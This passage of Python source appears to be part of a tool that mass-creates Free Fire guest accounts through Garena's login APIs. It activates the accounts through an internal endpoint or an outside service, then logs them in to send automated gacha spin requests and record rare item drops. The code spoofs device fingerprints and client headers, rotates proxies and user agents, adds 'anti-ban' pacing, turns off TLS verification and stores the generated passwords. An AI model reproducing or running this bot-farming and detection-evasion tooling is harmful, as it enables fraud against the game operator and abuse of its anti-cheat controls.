            19: device["device_id"],                 # unique_device_id
            20: device["ip"],                        # client_ip

            21: lang,                                # language
            22: open_id,                             # open_id
            23: "4",                                 # open_id_type
            24: "Handheld",                          # device_type secondary

            25: device["model"],                     # model
            26: "IND",                               # region

            29: access_token,                        # access_token
            30: 1,                                   # login_by

            # Network
            41: "Jio",
            42: "WIFI",

            # Analytics
            92: random.choice([19788, 20000, 21000]),
            93: "android_max",

            # Extra flags (from txt)
            97: 1,
            98: 1,
            99: "4",
            100: "4",
            104: 77149,
            105: 1,
        }

        # Encode as protobuf
        proto = ProtoBuilder.build(fields)

        # AES encrypt
        try:
            encrypted = SecurityEngine.encrypt_api_payload(proto.hex())
            return bytes.fromhex(encrypted)
        except Exception:
            return proto

    # ───────────────────────────────────────────────────────────────────
    #  Send MajorLogin → get JWT + account_id
    # ───────────────────────────────────────────────────────────────────
    def major_login(
        self,
        access_token: str,
        open_id: str,
        lang: str,
    ) -> Optional[Dict[str, str]]:
        """
        Send MajorLogin → returns {"account_id": str, "jwt": str} or None
        """
        try:
            payload = self._build_majorlogin_proto(open_id, access_token, lang)

            headers = {
                "User-Agent":        NetService.random_ua(),
                "Accept-Encoding":   "deflate, gzip",
                "X-GA-SV":           "1789535859",
                "Authorization":     f"Bearer {access_token}",
                "X-GA":              "v1 1",
                "ReleaseVersion":    Config.RELEASE_VER,
                "Content-Type":      "application/octet-stream",
                "X-Unity-Version":   "2018.4.12f1",
                "Host":              "loginbp.ppmainecoonghj.com",
            }

            resp = self.session.post(
                Config.URL_MAJOR_LOGIN,
                headers=headers,
                data=payload,
                verify=False,
                timeout=8,
            )

            if resp.status_code != 200:
                return None

            body = resp.content
            if not body or len(body) < 20:
                return None

            # Try extract JWT
            jwt = extract_jwt(body)
            account_id = None

            # If JWT found — decode account_id from payload
            if jwt and is_valid_jwt(jwt):
                try:
                    payload_b64 = jwt.split('.')[1]
                    pad_len = '=' * (4 - len(payload_b64) % 4)
                    decoded = json.loads(base64.urlsafe_b64decode(payload_b64 + pad_len))
                    account_id = (
                        decoded.get('account_id')
                        or decoded.get('external_id')
                        or decoded.get('uid')
                    )
                except Exception:
                    pass

            # If no JWT, try protobuf decode
            if not account_id:
                for offset in (0, 4, 8, 16, 64):
                    try:
                        sliced = body[offset:] if offset < len(body) else body
                        decoded, _ = blackboxprotobuf.decode_message(sliced)
                        if isinstance(decoded, dict):
                            for k in ('3', 3, b'3', 'account_id', b'account_id'):
                                if k in decoded:
                                    v = decoded[k]
                                    if isinstance(v, bytes):
                                        account_id = v.decode('utf-8', errors='ignore')
                                    else:
                                        account_id = str(v)
                                    break
                            if account_id:
                                break
                    except Exception:
                        continue

            if account_id:
                return {
                    "account_id": str(account_id),
                    "jwt":        jwt or "",
                }

        except Exception as e:
            log_error_to_file(str(e), "garena_major_login")

        return None


# ══════════════════════════════════════════════════════════════════════════
#  NETWORK SERVICE — session rotation + proxy
# ══════════════════════════════════════════════════════════════════════════
class NetService:
    @staticmethod
    def random_ua() -> str:
        return random.choice(USER_AGENTS)

    @staticmethod
    def rotated_session() -> requests.Session:
        """Rotating session with connection pool + optional proxy"""
        s = requests.Session()
        ad = requests.adapters.HTTPAdapter(
            pool_connections=20,
            pool_maxsize=20,
            max_retries=0,
        )
        s.mount('https://', ad)
        s.mount('http://', ad)

        with state.ip_lock:
            state.ip_counter += 1
            if state.ip_counter >= 20:
                state.ip_counter = 0
                if state.proxy_list:
                    p = random.choice(state.proxy_list)
                    s.proxies = {'http': p, 'https': p}
        return s


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 3 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 4 — ACCOUNT GENERATOR, ACTIVATION ENGINE, SAVE HELPERS
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  SAVE HELPERS (atomic writes)
# ══════════════════════════════════════════════════════════════════════════

def save_account_record(data: Dict[str, Any]) -> None:
    """Save generated account to accounts.json"""
    try:
        with state.file_lock:
            accounts = []
            if os.path.exists(Config.ACCOUNTS_FILE):
                try:
                    with open(Config.ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
                        file_data = json.load(f)
                        if isinstance(file_data, list):
                            accounts = file_data
                except Exception:
                    accounts = []

            accounts.append({
                "uid":                data["uid"],
                "password":           data["password"],
                "account_id":         data["account_id"],
                "name":               data["name"],
                "region":             data["region"],
                "date_created":       data["date_created"],
                "activated":          data.get("activated", False),
                "activation_status":  data.get("activation_status", ""),
                "activation_message": data.get("activation_message", ""),
            })

            tmp = Config.ACCOUNTS_FILE + ".tmp"
            with open(tmp, 'w', encoding='utf-8') as f:
                json.dump(accounts, f, indent=4, ensure_ascii=False)
            os.replace(tmp, Config.ACCOUNTS_FILE)
    except Exception as e:
        log_error_to_file(str(e), "save_account_record")


def save_activated_record(data: Dict[str, Any]) -> None:
    """Save activated account to activated_accounts.json"""
    try:
        with state.file_lock:
            accounts = []
            if os.path.exists(Config.ACTIVATED_FILE):
                try:
                    with open(Config.ACTIVATED_FILE, 'r', encoding='utf-8') as f:
                        file_data = json.load(f)
                        if isinstance(file_data, list):
                            accounts = file_data
                except Exception:
                    accounts = []

            accounts.append({
                "uid":                data["uid"],
                "password":           data["password"],
                "account_id":         data["account_id"],
                "name":               data["name"],
                "region":             data["region"],
                "date_created":       data["date_created"],
                "activated":          True,
                "activation_status":  data.get("activation_status", "SUCCESS"),
                "activation_message": data.get("activation_message", ""),
                "activated_at":       now_str(),
            })

            tmp = Config.ACTIVATED_FILE + ".tmp"
            with open(tmp, 'w', encoding='utf-8') as f:
                json.dump(accounts, f, indent=4, ensure_ascii=False)
            os.replace(tmp, Config.ACTIVATED_FILE)
    except Exception as e:
        log_error_to_file(str(e), "save_activated_record")


def save_activation_result(uid: str, status: str, message: str) -> None:
    """Append to in-memory activation results"""
    with state.results_lock:
        state.activation_results.append([uid, status, message])


def save_csv() -> None:
    """Dump activation results to CSV"""
    try:
        with open(Config.ACTIVATION_RESULTS_FILE, 'w', encoding='utf-8', newline='') as f:
            w = csv.writer(f)
            w.writerow(["uid", "status", "response"])
            with state.results_lock:
                w.writerows(state.activation_results)
    except Exception as e:
        log_error_to_file(str(e), "save_csv")


# ══════════════════════════════════════════════════════════════════════════
#  ACTIVATION ENGINE (IND + External fallback)
# ══════════════════════════════════════════════════════════════════════════
class ActivationEngine:
    """
    Two methods:
    1. External API (rg-act-ofc.vercel.app) — fast, working
    2. JWT-based GetLoginData (IND) — internal fallback
    """

    @staticmethod
    def activate_external(uid: str, password: str) -> Dict[str, Any]:
        """External API activation"""
        uid = str(uid).strip()
        password = str(password).strip()

        if not uid or not password:
            return {"activated": False, "status": "INVALID_DATA", "message": "UID/Password missing"}

        try:
            # Cooldown between requests
            with state.activation_lock:
                now = time.time()
                wait = Config.ACTIVATION_COOLDOWN - (now - state.last_activation_time)
                if wait > 0:
                    time.sleep(wait)
                state.last_activation_time = time.time()

            r = requests.get(
                Config.ACTIVATION_API,
                params={"uid": uid, "password": password},
                timeout=Config.ACTIVATION_TIMEOUT,
                verify=False,
                headers={"User-Agent": "Mozilla/5.0"},
            )

            try:
                data = r.json()
                msg = data.get("message", data.get("error", r.text))
            except ValueError:
                msg = r.text

            msg = str(msg).replace("\n", " ")[:300]

            if 200 <= r.status_code < 300:
                low = msg.lower()
                if any(k in low for k in ["success", "activated", "ok", "done", "already", "true"]):
                    return {"activated": True, "status": "SUCCESS", "message": msg}
                # Response with account data = success
                if "account_id" in str(data).lower() or "region" in str(data).lower():
                    return {"activated": True, "status": "SUCCESS", "message": msg}
                return {"activated": True, "status": "SUCCESS", "message": msg or "Activated"}

            return {"activated": False, "status": f"HTTP_{r.status_code}", "message": msg}

        except requests.Timeout:
            return {"activated": False, "status": "TIMEOUT", "message": "Request timed out"}
        except requests.RequestException as e:
            return {"activated": False, "status": "NETWORK_ERROR", "message": str(e)[:200]}
        except Exception as e:
            return {"activated": False, "status": "ERROR", "message": str(e)[:200]}

    @staticmethod
    def activate_jwt(acc: Dict[str, Any], session=None) -> Dict[str, Any]:
        """JWT-based GetLoginData activation (IND)"""
        jwt = acc.get("jwt", "")
        open_id = acc.get("open_id", "")

        if not jwt or not open_id:
            return {"activated": False, "status": "NO_JWT", "message": "No JWT/open_id"}

        try:
            # Build GetLoginData payload
            device = generate_device_info()

            fields = {
                3:  datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S'),
                4:  "free fire",
                5:  1,
                7:  Config.GAME_VERSION,
                8:  device["os_string"],
                9:  "Handheld",
                10: "Jio",
                11: "WIFI",
                12: 1600,
                13: 720,
                14: "320",
                15: "ARM64 FP ASIMD AES | 2301 | 8",
                16: 2799,
                17: device["gpu"],
                18: "OpenGL ES 3.2 build 1.1@5425693",
                19: device["device_id"],
                20: device["ip"],
                21: "en",
                22: open_id,
                23: "4",
                24: "Handheld",
                25: device["model"],
                26: "IND",
                29: jwt,
                30: 1,
                41: "Jio",
                42: "WIFI",
                57: "1ac4b80ecf0478a44203bf8fac6120f5",
                60: 19799,
                61: 1198,
                62: 5056,
                64: 1430,
                65: 19999,
                66: 1198,
                67: 19799,
                70: 4,
                73: 2,
                74: "/data/app/com.dts.freefireth-FFifmAAfKh0HbXBegWOzaxw==/lib/arm64",
                76: 1,
                77: "4c322aeb56444feaa151d1ea91a8f7f2|/data/app/com.dts.freefireth-FFifmAAfKh0HbXBegWOzaxw==/base.apk",
                78: 6,
                79: 2,
                81: "64",
                83: "2019120816",
                86: "OpenGLES2",
                87: 3071,
                88: 8,
                90: "Mumbai",
                91: "DL",
                92: 13080,
                93: "3rd_party",
                95: 111207,
                96: '{"cur_rate":null,"support_etc2":false}',
                97: 1,
                99: "30",
                100: "38",
                102: "47504412000e085134",
            }

            proto = ProtoBuilder.build(fields)

            try:
                encrypted = bytes.fromhex(SecurityEngine.encrypt_api_payload(proto.hex()))
            except Exception:
                return {"activated": False, "status": "ENCODE_FAIL", "message": "AES encryption failed"}

            headers = {
                "Host":             "client.ind.freefiremobile.com",
                "User-Agent":       "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
                "Accept":           "*/*",
                "Accept-Encoding":  "deflate, gzip",
                "Authorization":    f"Bearer {jwt}",
                "X-GA":             "v1 1",
                "ReleaseVersion":   Config.RELEASE_VER,
                "Content-Type":     "application/octet-stream",
                "X-Unity-Version":  "2022.3.47f1",
            }

            if session is None:
                session = requests.Session()

            r = session.post(
                Config.URL_GETLOGIN_IND,
                headers=headers,
                data=encrypted,
                verify=False,
                timeout=8,
            )

            if r.status_code == 200:
                online = "OK"
                chat = "OK"
                try:
                    decoded, _ = blackboxprotobuf.decode_message(r.content)
                    if isinstance(decoded, dict):
                        online = decoded.get('14', 'OK')
                        chat = decoded.get('32', 'OK')
                        if isinstance(online, bytes):
                            online = online.decode('utf-8', errors='ignore')
                        if isinstance(chat, bytes):
                            chat = chat.decode('utf-8', errors='ignore')
                except Exception:
                    pass
                return {
                    "activated": True,
                    "status": "JWT_OK",
                    "message": f"Activated | {online}",
                }
            elif r.status_code in (401, 403):
                return {"activated": False, "status": f"HTTP_{r.status_code}", "message": "JWT invalid"}
            else:
                return {"activated": False, "status": f"HTTP_{r.status_code}", "message": r.text[:200]}

        except Exception as e:
            return {"activated": False, "status": "ERROR", "message": str(e)[:200]}

    @classmethod
    def activate(cls, uid: str, password: str, acc: Dict[str, Any] = None, session=None) -> Dict[str, Any]:
        """
        Try JWT first, then external fallback.
        """
        # Method 1: JWT (IND internal)
        if acc and acc.get("jwt") and acc.get("open_id"):
            result = cls.activate_jwt(acc, session=session)
            if result["activated"]:
                return result

        # Method 2: External API
        return cls.activate_external(uid, password)


# ══════════════════════════════════════════════════════════════════════════
#  ACCOUNT GENERATOR (Register → Grant → MajorRegister → MajorLogin → Activate)
# ══════════════════════════════════════════════════════════════════════════
class AccountGenerator:
    """
    Full flow for ONE account:
    1. Guest Register → uid + password
    2. Token Grant → access_token + open_id
    3. Major Register → account_id
    4. Newbie Choice (optional)
    5. Major Login → JWT
    6. Activation → activated
    7. Save
    """

    @classmethod
    def create_one(cls, region: str, prefix: str, session=None) -> Optional[Dict[str, Any]]:
        """Create one account — full flow"""
        for attempt in range(2):
            if state.exit_flag:
                return None

            try:
                # Create dedicated session
                api = GarenaClient()
                if session:
                    api.session = session

                # ═══ STEP 1: Guest Register ═══
                password = SecurityEngine.generate_ultra_secure_password()

                reg_payload = json.dumps({
                    "app_id":       Config.APP_ID,
                    "client_type":  2,
                    "password":     password,
                    "source":       2,
                }, separators=(',', ':'))

                headers_reg = {
                    "User-Agent":       NetService.random_ua(),
                    "Connection":       "Keep-Alive",
                    "Accept":           "application/json",
                    "Accept-Encoding":  "gzip",
                    "Authorization":    f"Signature {SecurityEngine.generate_signature(reg_payload)}",
                    "Content-Type":     "application/json; charset=utf-8",
                    "Host":             "100067.connect.garena.com",
                }

                resp_reg = api.session.post(
                    Config.URL_GUEST_REGISTER,
                    headers=headers_reg,
                    data=reg_payload,
                    timeout=8,
                    verify=False,
                )

                if resp_reg.status_code == 429:
                    time.sleep(5)
                    continue
                if resp_reg.status_code != 200:
                    continue

                try:
                    reg_data = resp_reg.json()
                    if reg_data.get("code") != 0:
                        continue
                    uid = reg_data['data']['uid']
                except Exception:
                    continue

                # ═══ STEP 2: Token Grant ═══
                device_id = generate_device_uuid()

                tok_payload = json.dumps({
                    "client_id":      Config.APP_ID,
                    "client_secret":  Config.API_HEX_KEY,
                    "client_type":    2,
                    "device_id":      device_id,
                    "password":       password,
                    "response_type":  "token",
                    "uid":            uid,
                }, separators=(',', ':'))

                headers_tok = {
                    "User-Agent":       NetService.random_ua(),
                    "Connection":       "Keep-Alive",
                    "Accept":           "application/json",
                    "Accept-Encoding":  "gzip",
                    "Content-Type":     "application/json; charset=utf-8",
                    "Host":             "100067.connect.garena.com",
                }

                resp_tok = api.session.post(
                    Config.URL_TOKEN_GRANT,
                    headers=headers_tok,
                    data=tok_payload,
                    timeout=8,
                    verify=False,
                )

                if resp_tok.status_code != 200:
                    continue

                try:
                    tok_data = resp_tok.json()
                    if tok_data.get("code") != 0:
                        continue
                    access_token = tok_data['data']['access_token']
                    open_id = tok_data['data']['open_id']
                except Exception:
                    continue

                # ═══ STEP 3: Major Register ═══
                nick = generate_nickname(prefix=prefix)
                lang = Config.REGION_LANG.get(region.upper(), "en")

                # Build F14 field (open_id XOR keystream)
                keystream = [
                    0x30, 0x30, 0x30, 0x32, 0x30, 0x31, 0x37, 0x30,
                    0x30, 0x30, 0x30, 0x30, 0x32, 0x30, 0x31, 0x37,
                    0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x30, 0x31,
                    0x37, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x30,
                ]
                try:
                    field_f14 = codecs.decode(
                        ''.join(chr(ord(open_id[i]) ^ keystream[i % len(keystream)]) for i in range(len(open_id)))
                        .encode('unicode_escape').decode('utf-8'),
                        'unicode_escape'
                    ).encode('latin1')
                except Exception:
                    field_f14 = b''

                proto_register = ProtoBuilder.build({
                    1:  nick,
                    2:  access_token,
                    3:  open_id,
                    5:  102000007,
                    6:  4,
                    7:  1,
                    13: 1,
                    14: field_f14,
                    15: lang,
                    16: 1,
                    17: 1,
                    22: FIELD_22,
                })

                try:
                    enc_major = bytes.fromhex(SecurityEngine.encrypt_api_payload(proto_register.hex()))
                except Exception:
                    continue

                headers_major = {
                    "User-Agent":       NetService.random_ua(),
                    "Accept-Encoding":  "deflate, gzip",
                    "X-GA-SV":          "1789535859",
                    "Authorization":    "Bearer",
                    "X-GA":             "v1 1",
                    "ReleaseVersion":   Config.RELEASE_VER,
                    "Content-Type":     "application/x-www-form-urlencoded",
                    "X-Unity-Version":  "2018.4.12f1",
                    "Host":             "loginbp.ppmainecoonghj.com",
                }

                api.session.post(
                    Config.URL_MAJOR_REGISTER,
                    headers=headers_major,
                    data=enc_major,
                    verify=False,
                    timeout=8,
                )

                # ═══ STEP 4: Major Login (JWT) ═══
                login_data = api.major_login(access_token, open_id, lang)
                if not login_data:
                    continue

                account_id = login_data["account_id"]
                jwt = login_data.get("jwt", "")

                # ═══ STEP 5: Activation ═══
                # Prepare partial account for activation
                partial_acc = {
                    "uid":          str(uid),
                    "password":     password,
                    "account_id":   str(account_id),
                    "open_id":      open_id,
                    "access_token": access_token,
                    "jwt":          jwt,
                    "region":       region,
                }

                act = ActivationEngine.activate(str(uid), password, acc=partial_acc, session=api.session)
                save_activation_result(str(uid), act["status"], act["message"])

                # ═══ STEP 6: Build final record ═══
                record = {
                    "uid":                int(uid),
                    "password":           password,
                    "account_id":         str(account_id),
                    "name":               nick,
                    "region":             region,
                    "date_created":       now_str(),
                    "activated":          act["activated"],
                    "activation_status":  act["status"],
                    "activation_message": act["message"],
                }

                # Save to accounts.json
                save_account_record(record)

                # Save to activated_accounts.json if activated
                if act["activated"]:
                    save_activated_record(record)

                return record

            except requests.Timeout:
                time.sleep(0.5)
                continue
            except requests.ProxyError:
                continue
            except Exception as e:
                log_error_to_file(str(e), "AccountGenerator.create_one")
                time.sleep(0.3)
                continue

        return None


# ══════════════════════════════════════════════════════════════════════════
#  WORKER TASK (Generator)
# ══════════════════════════════════════════════════════════════════════════

def generator_worker_task(region: str, prefix: str, target: int) -> None:
    """Worker thread — generate accounts until target reached"""
    while not state.exit_flag:
        with state.lock:
            if state.success_count >= target:
                break

        acc = AccountGenerator.create_one(region, prefix)
        if acc:
            with state.lock:
                if state.success_count >= target:
                    break
                state.success_count += 1
                if acc.get("activated", False):
                    state.activated_count += 1
                curr = state.success_count

            UI.account_card(curr, target, acc)


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 4 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 5 — LIVE STATS, ASYNC HTTP, SPINNER ENGINE, RARE DETECTION
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  LIVE STATS TRACKER (thread-safe)
# ══════════════════════════════════════════════════════════════════════════
class LiveStats:
    """Thread-safe live statistics tracker for spinner"""

    def __init__(self, total_accounts: int, total_spins: int):
        self.total_accounts = total_accounts
        self.total_spins    = total_spins
        self.start_time     = time.time()

        self._lock          = threading.Lock()
        self.completed      = 0
        self.spins_done     = 0
        self.spins_failed   = 0
        self.specials       = 0
        self.logins_ok      = 0
        self.logins_fail    = 0

        self.by_event       = {}
        self.by_region      = {}
        self.rare_found     = []

        self._last_print    = 0
        self._recent_drops  = deque(maxlen=5)

    def inc_account(self):
        with self._lock:
            self.completed += 1

    def inc_spin_ok(self):
        with self._lock:
            self.spins_done += 1

    def inc_spin_fail(self):
        with self._lock:
            self.spins_failed += 1

    def inc_special(self):
        with self._lock:
            self.specials += 1

    def inc_login_ok(self):
        with self._lock:
            self.logins_ok += 1

    def inc_login_fail(self):
        with self._lock:
            self.logins_fail += 1

    def add_drop(self, text: str):
        with self._lock:
            self._recent_drops.appendleft(text)

    def record_event(self, event_name: str, success: bool, is_special: bool = False):
        with self._lock:
            if event_name not in self.by_event:
                self.by_event[event_name] = {"ok": 0, "fail": 0, "special": 0}
            if success:
                self.by_event[event_name]["ok"] += 1
            else:
                self.by_event[event_name]["fail"] += 1
            if is_special:
                self.by_event[event_name]["special"] += 1

    def record_region(self, region: str, success: bool, is_special: bool = False):
        with self._lock:
            r = region.upper()
            if r not in self.by_region:
                self.by_region[r] = {"ok": 0, "fail": 0, "special": 0}
            if success:
                self.by_region[r]["ok"] += 1
            else:
                self.by_region[r]["fail"] += 1
            if is_special:
                self.by_region[r]["special"] += 1

    def add_rare(self, uid: str, item_name: str, event_name: str):
        with self._lock:
            self.rare_found.append({
                "uid":   uid,
                "item":  item_name,
                "event": event_name,
                "time":  now_str(),
            })

    def snapshot(self) -> dict:
        with self._lock:
            elapsed = max(0.1, time.time() - self.start_time)
            return {
                "completed":      self.completed,
                "total_accounts": self.total_accounts,
                "spins_done":     self.spins_done,
                "spins_failed":   self.spins_failed,
                "specials":       self.specials,
                "logins_ok":      self.logins_ok,
                "logins_fail":    self.logins_fail,
                "elapsed":        elapsed,
                "rate":           self.spins_done / elapsed,
                "progress":       (self.completed / max(1, self.total_accounts)) * 100,
                "by_event":       dict(self.by_event),
                "by_region":      dict(self.by_region),
                "rare_found":     list(self.rare_found),
                "recent":         list(self._recent_drops),
            }

    def should_print(self, interval: float = 5.0) -> bool:
        with self._lock:
            now = time.time()
            if now - self._last_print >= interval:
                self._last_print = now
                return True
        return False


# ══════════════════════════════════════════════════════════════════════════
#  ASYNC HTTP SESSION BUILDERS
# ══════════════════════════════════════════════════════════════════════════

def build_async_connector() -> aiohttp.TCPConnector:
    """Build aiohttp TCP connector with pooling"""
    return aiohttp.TCPConnector(
        limit=Config.HTTP_POOL_LIMIT,
        limit_per_host=Config.HTTP_POOL_PER_HOST,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        force_close=False,
        use_dns_cache=True,
        ssl=False,
    )


def build_async_timeout() -> aiohttp.ClientTimeout:
    """Build aiohttp timeout"""
    return aiohttp.ClientTimeout(
        total=Config.HTTP_TIMEOUT[1] * 3,
        connect=Config.HTTP_TIMEOUT[0],
        sock_read=Config.HTTP_TIMEOUT[1],
    )


# ══════════════════════════════════════════════════════════════════════════
#  ASYNC REQUEST WITH RETRY
# ══════════════════════════════════════════════════════════════════════════

async def async_request_with_retry(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    headers: dict,
    data=None,
    json_body=None,
    proxy=None,
    max_retries: int = 3,
) -> Tuple[int, bytes]:
    """
    Async HTTP request with retry logic.
    Returns: (status_code, response_bytes)
    """
    for attempt in range(max_retries):
        try:
            # Anti-ban pacing
            await asyncio.sleep(random.uniform(
                ANTI_BAN.get("min_request_gap", 0.35),
                ANTI_BAN.get("max_request_gap", 0.65)
            ))

            kwargs = {
                "headers":         headers,
                "ssl":             False,
                "allow_redirects": True,
            }

            if proxy and isinstance(proxy, dict):
                kwargs["proxy"] = proxy.get("http")

            if data is not None:
                kwargs["data"] = data
            if json_body is not None:
                kwargs["json"] = json_body

            async with session.request(method, url, **kwargs) as resp:
                body = await resp.read()

                if resp.status == 200:
                    return resp.status, body

                if resp.status == 429:
                    await asyncio.sleep(2)
                    continue

                if resp.status == 503:
                    await asyncio.sleep(3)
                    continue

                if resp.status == 403:
                    await asyncio.sleep(2)
                    continue

                return resp.status, body

        except asyncio.TimeoutError:
            await asyncio.sleep(0.5)
            continue

        except aiohttp.ClientProxyConnectionError:
            await asyncio.sleep(1)
            continue

        except aiohttp.ClientConnectorError:
            await asyncio.sleep(1)
            continue

        except Exception as e:
            log_error_to_file(str(e), f"async_request[{method}]")
            await asyncio.sleep(0.5)
            continue

    return 0, b""


# ══════════════════════════════════════════════════════════════════════════
#  ASYNC LOGIN (fresh JWT per event)
# ══════════════════════════════════════════════════════════════════════════

class LoginResult:
    """Container for login result"""
    __slots__ = ("success", "jwt", "open_id", "account_id", "error", "method")

    def __init__(self, success: bool, jwt: Optional[str] = None,
                 open_id: Optional[str] = None, account_id: Optional[str] = None,
                 error: Optional[str] = None, method: str = "internal"):
        self.success = success
        self.jwt = jwt
        self.open_id = open_id
        self.account_id = account_id
        self.error = error
        self.method = method


def _token_grant_sync(uid: str, password: str, proxy=None) -> Optional[dict]:
    """Sync: Token grant — access_token + open_id"""
    try:
        body = {
            "client_id":      Config.APP_ID,
            "client_secret":  Config.CLIENT_SECRET,
            "client_type":    2,
            "device_id":      generate_device_uuid(),
            "password":       password,
            "response_type":  "token",
            "uid":            int(uid),
        }

        headers = {
            "User-Agent":   "GarenaMSDK/4.0.19P9",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        r = requests.post(
            Config.URL_TOKEN_GRANT,
            headers=headers,
            json=body,
            timeout=8,
            verify=False,
            allow_redirects=True,
            proxies=proxy,
        )

        if r.status_code != 200:
            return None

        data = r.json()
        grant_data = data.get("data", data)
        at = grant_data.get("access_token")
        oid = grant_data.get("open_id")

        if not at or not oid:
            return None

        return {"access_token": str(at), "open_id": str(oid)}

    except Exception:
        return None


def _major_login_sync(open_id: str, access_token: str, lang: str = "en", proxy=None) -> Optional[str]:
    """Sync: MajorLogin → JWT"""
    try:
        client = GarenaClient()
        result = client.major_login(access_token, open_id, lang)
        if result and result.get("jwt"):
            return result["jwt"]
    except Exception:
        pass
    return None


async def full_login_async(
    session: aiohttp.ClientSession,
    uid: str,
    password: str,
    proxy=None,
) -> LoginResult:
    """
    Async: Full login flow for spinner.
    Token Grant → MajorLogin → JWT
    """
    loop = asyncio.get_event_loop()

    # Step 1: Token Grant (sync inside executor)
    try:
        grant = await loop.run_in_executor(
            None,
            lambda: _token_grant_sync(uid, password, proxy=proxy)
        )
    except Exception as e:
        log_error_to_file(str(e), "full_login_async_grant")
        return LoginResult(False, error="grant_exception")

    if not grant:
        return LoginResult(False, error="grant_failed")

    access_token = grant["access_token"]
    open_id = grant["open_id"]

    # Step 2: MajorLogin (sync inside executor)
    try:
        jwt = await loop.run_in_executor(
            None,
            lambda: _major_login_sync(open_id, access_token, proxy=proxy)
        )
    except Exception as e:
        log_error_to_file(str(e), "full_login_async_login")
        return LoginResult(False, open_id=open_id, error="login_exception")

    if not jwt:
        return LoginResult(False, open_id=open_id, error="jwt_failed")

    return LoginResult(True, jwt=jwt, open_id=open_id, method="internal")


# ══════════════════════════════════════════════════════════════════════════
#  SPIN REQUEST (PurchaseGacha)
# ══════════════════════════════════════════════════════════════════════════

async def send_spin_request_async(
    session: aiohttp.ClientSession,
    region: str,
    jwt: str,
    payload_hex: str,
    proxy=None,
) -> Tuple[int, bytes]:
    """
    Async: Send spin (PurchaseGacha) request.
    Returns: (status_code, response_bytes)
    """
    url = REGION_URLS.get(region.upper())
    if not url:
        return 0, b"invalid_region"

    if not is_valid_payload(payload_hex):
        return 0, b"invalid_payload"

    try:
        payload = bytes.fromhex(payload_hex)
    except ValueError:
        return 0, b"hex_decode_error"

    headers = {
        "User-Agent":      "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept":          "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Content-Type":    "application/octet-stream",
        "X-GA":            "v1 1",
        "ReleaseVersion":  Config.RELEASE_VER,
        "X-Unity-Version": "2022.3.47f1",
        "Authorization":   f"Bearer {jwt}",
    }

    status, body = await async_request_with_retry(
        session,
        "POST",
        url,
        headers,
        data=payload,
        proxy=proxy,
        max_retries=2,
    )

    return status, body


# ══════════════════════════════════════════════════════════════════════════
#  SPIN RESPONSE PARSER
# ══════════════════════════════════════════════════════════════════════════

def find_item_id(data) -> Optional[int]:
    """Find item_id in decoded protobuf response"""
    if isinstance(data, dict):
        for key in (1, '1'):
            if key in data:
                sub = data[key]
                if isinstance(sub, dict):
                    for k2 in (2, '2'):
                        if k2 in sub:
                            val = sub[k2]
                            if isinstance(val, int) and val > 100:
                                return val

        for value in data.values():
            result = find_item_id(value)
            if result is not None:
                return result

    elif isinstance(data, list):
        for item in data:
            result = find_item_id(item)
            if result is not None:
                return result

    return None


def parse_spin_response(body: bytes) -> Tuple[bool, Optional[int], Optional[str]]:
    """
    Parse spin response protobuf.
    Returns: (success, item_id, item_name)
    """
    if not body:
        return False, None, None

    try:
        decoded, _ = blackboxprotobuf.decode_message(body)
        item_id = find_item_id(decoded)

        if item_id is None:
            return False, None, None

        item_name = get_item_name(item_id)
        return True, item_id, item_name

    except Exception as e:
        log_error_to_file(str(e), "parse_spin_response")
        return False, None, None


# ══════════════════════════════════════════════════════════════════════════
#  RESULT SAVE HELPERS (spinner)
# ══════════════════════════════════════════════════════════════════════════

def _build_result_entry(uid: str, pwd: str, item_id: int, item_name: str,
                        region: str, event_name: str, method: str = "internal") -> dict:
    return {
        "timestamp":  now_str(),
        "guestUid":   str(uid),
        "guestPass":  str(pwd),
        "region":     region.upper(),
        "event":      event_name,
        "item_id":    int(item_id),
        "item_name":  str(item_name),
        "method":     method,
    }


def _flush_save_queue() -> None:
    """Flush all pending writes to disk"""
    with state.file_lock:
        batch = list(_save_queue)
        _save_queue.clear()
        _save_last_flush[0] = time.time()

    if not batch:
        return

    by_file = {}
    for rec in batch:
        by_file.setdefault(rec["_path"], []).append(rec)

    for path, records in by_file.items():
        clean = [
            {k: v for k, v in r.items() if not k.startswith("_")}
            for r in records
        ]

        existing = []
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    if content:
                        existing = json.loads(content)
            except Exception:
                existing = []

        existing.extend(clean)

        tmp = f"{path}.tmp.{os.getpid()}.{int(time.time() * 1000)}"
        try:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(existing, f, indent=4, ensure_ascii=False)
            os.replace(tmp, path)
        except Exception as e:
            _safe_print(f"{NEXUS.RED}[!] Flush error on {path}: {e}{NEXUS.RESET}")


# Queue state
_save_queue       = []
_save_queue_lock  = threading.Lock()
_save_last_flush  = [time.time()]


def enqueue_write(path: str, entry: dict) -> None:
    """Queue a write operation"""
    rec = dict(entry)
    rec["_path"] = path
    with _save_queue_lock:
        _save_queue.append(rec)
        should_flush = (
            len(_save_queue) >= Config.BATCH_SAVE_SIZE
            or (time.time() - _save_last_flush[0]) >= Config.BATCH_SAVE_INTERVAL
        )
    if should_flush:
        _flush_save_queue()


def save_final_data() -> None:
    """Force flush all pending writes"""
    try:
        _flush_save_queue()
    except Exception as e:
        _safe_print(f"{NEXUS.RED}[!] Final flush error: {e}{NEXUS.RESET}")


def save_all_result(entry: dict) -> None:
    enqueue_write(Config.ALL_ITEMS_FILE, entry)


